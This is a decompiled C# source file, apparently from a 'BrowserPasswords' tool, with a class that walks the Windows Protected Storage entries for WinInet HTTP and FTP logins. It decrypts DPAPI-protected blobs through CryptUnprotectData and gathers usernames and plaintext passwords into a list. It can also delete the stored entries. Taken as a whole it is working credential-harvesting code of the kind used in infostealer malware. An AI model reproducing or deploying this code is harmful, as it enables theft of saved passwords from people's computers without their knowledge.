using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using BrowserPasswords.PStoreLib;
using Microsoft.VisualBasic;

namespace BrowserPasswords
{
	// Token: 0x0200000D RID: 13
	internal class CHttpFtpAuths : CUtils, IEnumerable<CHttpFtpAuth>
	{
		// Token: 0x060000D9 RID: 217 RVA: 0x00002604 File Offset: 0x00000804
		public CHttpFtpAuths()
		{
			this.guidWinInet = new Guid("{5E7E8100-9138-11D1-945A-00C04FC308FF}");
			this.subguidWinInet = new Guid("{00000000-0000-0000-0000-000000000000}");
			this.m_PStore = new CProtectStore();
			this.m_WinInetPass = new List<CHttpFtpAuth>();
		}

		// Token: 0x060000DA RID: 218
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenA(IntPtr lpString);

		// Token: 0x060000DB RID: 219
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CredFree(int pBuffer);

		// Token: 0x060000DC RID: 220
		[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptUnprotectData(ref CHttpFtpAuths.DATA_BLOB pDataIn, int ppszDataDescr, int pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref CHttpFtpAuths.DATA_BLOB pDataOut);

		// Token: 0x060000DD RID: 221
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int LocalFree(int hMem);

		// Token: 0x060000DE RID: 222
		[DllImport("oleaut32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern string SysAllocString(int pOlechar);

		// Token: 0x060000DF RID: 223 RVA: 0x00002644 File Offset: 0x00000844
		private void AddPasswdInfo(string strRess)
		{
			byte[] array = this.m_PStore.ReadItem(this.guidWinInet, this.subguidWinInet, strRess);
			GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
			IntPtr intPtr = gchandle.AddrOfPinnedObject();
			checked
			{
				int num = Information.UBound(array, 1) + 1;
				if (Strings.InStr(strRess, "DPAPI:", CompareMethod.Binary) == 1)
				{
					CHttpFtpAuths.DATA_BLOB data_BLOB;
					data_BLOB.cbData = num;
					data_BLOB.pbData = intPtr.ToInt32();
					CHttpFtpAuths.DATA_BLOB data_BLOB2;
					int num2 = CHttpFtpAuths.CryptUnprotectData(ref data_BLOB, 0, 0, 0, 0, 0, ref data_BLOB2);
					if (num2 != 0)
					{
						int num3 = Strings.InStr(strRess, "@", CompareMethod.Binary);
						List<CHttpFtpAuth> winInetPass = this.m_WinInetPass;
						CProtectStore pstore = this.m_PStore;
						string szUserName = Strings.Mid(strRess, 14, num3 - 14);
						IntPtr ptr = new IntPtr(data_BLOB2.pbData);
						winInetPass.Add(new CHttpFtpAuth(pstore, strRess, szUserName, this.CopyString(ptr), string.Empty, Strings.Mid(strRess, 8), 0));
						CHttpFtpAuths.LocalFree(data_BLOB2.pbData);
					}
				}
				else
				{
					string expression;
					if (CHttpFtpAuths.lstrlenA(intPtr) != num - 1)
					{
						expression = Marshal.PtrToStringUni(intPtr);
					}
					else
					{
						expression = Marshal.PtrToStringAnsi(intPtr);
					}
					string[] array2 = Strings.Split(expression, ":", -1, CompareMethod.Binary);
					int num3 = Strings.InStr(strRess, "/", CompareMethod.Binary);
					if (num3 > 0)
					{
						this.m_WinInetPass.Add(new CHttpFtpAuth(this.m_PStore, strRess, array2[0], array2[1], Strings.Mid(strRess, num3 + 1), Strings.Mid(strRess, 1, num3 - 1), 1));
					}
					else
					{
						this.m_WinInetPass.Add(new CHttpFtpAuth(this.m_PStore, strRess, array2[0], array2[1], string.Empty, strRess, 1));
					}
				}
				gchandle.Free();
			}
		}

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000E0 RID: 224 RVA: 0x000027D4 File Offset: 0x000009D4
		// (set) Token: 0x060000E1 RID: 225 RVA: 0x000027EC File Offset: 0x000009EC
		public PST_KEY KeyType
		{
			get
			{
				return this.m_KeyType;
			}
			set
			{
				this.m_KeyType = value;
				this.m_PStore.KeyType = value;
			}
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x00002804 File Offset: 0x00000A04
		public void Delete(string szResourceName)
		{
			this.m_PStore.DeleteItem(this.guidWinInet, this.subguidWinInet, szResourceName);
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00002820 File Offset: 0x00000A20
		public void Refresh()
		{
			this.m_WinInetPass.Clear();
			CItems citems = this.m_PStore.get_Items(this.guidWinInet, this.subguidWinInet);
			checked
			{
				if (citems != null)
				{
					int num = 0;
					try
					{
						foreach (object obj in citems)
						{
							CItem citem = (CItem)obj;
							this.AddPasswdInfo(citem.Name);
							num++;
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x000028A8 File Offset: 0x00000AA8
		public IEnumerator<CHttpFtpAuth> GetEnumerator()
		{
			this.Refresh();
			return (IEnumerator<CHttpFtpAuth>)this.m_WinInetPass.GetEnumerator();
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x000028D4 File Offset: 0x00000AD4
		public IEnumerator GetEnumerator1()
		{
			this.Refresh();
			return (IEnumerator)this.m_WinInetPass.GetEnumerator();
		}

		// Token: 0x0400006D RID: 109
		private readonly Guid guidWinInet;

		// Token: 0x0400006E RID: 110
		private readonly Guid subguidWinInet;

		// Token: 0x0400006F RID: 111
		private CProtectStore m_PStore;

		// Token: 0x04000070 RID: 112
		private PST_KEY m_KeyType;

		// Token: 0x04000071 RID: 113
		private List<CHttpFtpAuth> m_WinInetPass;

		// Token: 0x0200000E RID: 14
		private struct DATA_BLOB
		{
			// Token: 0x04000072 RID: 114
			public int cbData;

			// Token: 0x04000073 RID: 115
			public int pbData;
		}

		// Token: 0x0200000F RID: 15
		private struct WinInetPass
		{
			// Token: 0x04000074 RID: 116
			public int dwType;

			// Token: 0x04000075 RID: 117
			public string strResource;

			// Token: 0x04000076 RID: 118
			public string strURL;

			// Token: 0x04000077 RID: 119
			public string strUserName;

			// Token: 0x04000078 RID: 120
			public string strPassword;

			// Token: 0x04000079 RID: 121
			public string strDescription;
		}
	}
}
